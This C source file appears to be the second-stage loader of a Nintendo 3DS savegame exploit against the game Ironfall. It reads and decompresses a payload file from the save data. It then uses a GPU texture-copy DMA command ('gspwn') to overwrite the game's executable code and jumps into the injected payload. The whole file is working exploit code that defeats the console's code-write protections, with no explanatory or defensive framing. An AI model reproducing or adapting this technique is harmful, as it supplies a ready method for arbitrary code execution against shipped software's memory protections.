#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>

#include "decomp.h"
#include "imports.h"

#define LINEAR_BUFFER ((u8*)0x31000000)

Result gspwn(void* dst, void* src, u32 size)
{
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	return _GSPGPU_GxTryEnqueue(sharedGspCmdBuf, gxCommand);
}

Result _GSPGPU_SetBufferSwap(Handle handle, u32 screenid, GSP_FramebufferInfo framebufinfo)
{
	Result ret=0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x00050200;
	cmdbuf[1] = screenid;
	memcpy(&cmdbuf[2], &framebufinfo, sizeof(GSP_FramebufferInfo));
	
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

void _main()
{
	Handle fileHandle = 0x0;
	Result ret = 0x0;

	u32 compressed_size = 0x0;
	u8* compressed_buffer = LINEAR_BUFFER;

	// load payload.bin from savegame
	ret = _FSUSER_OpenFileDirectly(fsHandle, &fileHandle, 0x0, 0x00000004, PATH_EMPTY, "", 1, PATH_CHAR, "/payload.bin", 13, 0x1, 0x0);
	if(ret)*(u32*)ret = 0xdead0001;

	ret = _FSUSER_ReadFile(&fileHandle, &compressed_size, 0x0, compressed_buffer, 0xA000);
	if(ret)*(u32*)ret = 0xdead0002;

	u8* decompressed_buffer = &compressed_buffer[(compressed_size + 0xfff) & ~0xfff];
	u32 decompressed_size = lzss_get_decompressed_size(compressed_buffer, compressed_size);

	// decompress payload
	ret = lzss_decompress(compressed_buffer, compressed_size, decompressed_buffer, decompressed_size);	

	// copy payload to text
	ret = _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)decompressed_buffer, decompressed_size);
	ret = gspwn((void*)(IRON_CODE_LINEAR_BASE + 0x00101000 - 0x00100000), decompressed_buffer, (decompressed_size + 0x1f) & ~0x1f);
	svc_sleepThread(100*1000*1000);

	// put framebuffers in linear mem so they're writable
	u8* top_framebuffer = &LINEAR_BUFFER[0x00100000];
	u8* low_framebuffer = &top_framebuffer[0x00046500];
	_GSPGPU_SetBufferSwap(*gspHandle, 0, (GSP_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
	_GSPGPU_SetBufferSwap(*gspHandle, 1, (GSP_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	// un-init DSP so killing Ironfall will work
	_DSP_UnloadComponent(dspHandle);
	_DSP_RegisterInterruptEvents(dspHandle, 0x0, 0x2, 0x2);

	// run payload
	{
		void (*payload)(u32* paramlk, u32* stack_pointer) = (void*)0x00101000;
		u32* paramblk = (u32*)LINEAR_BUFFER;

		paramblk[0x1c >> 2] = IRON_GSPGPU_GXCMD4;
		paramblk[0x20 >> 2] = IRON_GSPGPU_FLUSHDATACACHE_WRAPPER;
		paramblk[0x48 >> 2] = 0x8d; // flags
		paramblk[0x58 >> 2] = IRON_GSPGPU_HANDLE;
		paramblk[0x64 >> 2] = 0x08010000;

		payload(paramblk, (u32*)(0x10000000 - 4));
	}

	*(u32*)ret = 0xdead0008;
}
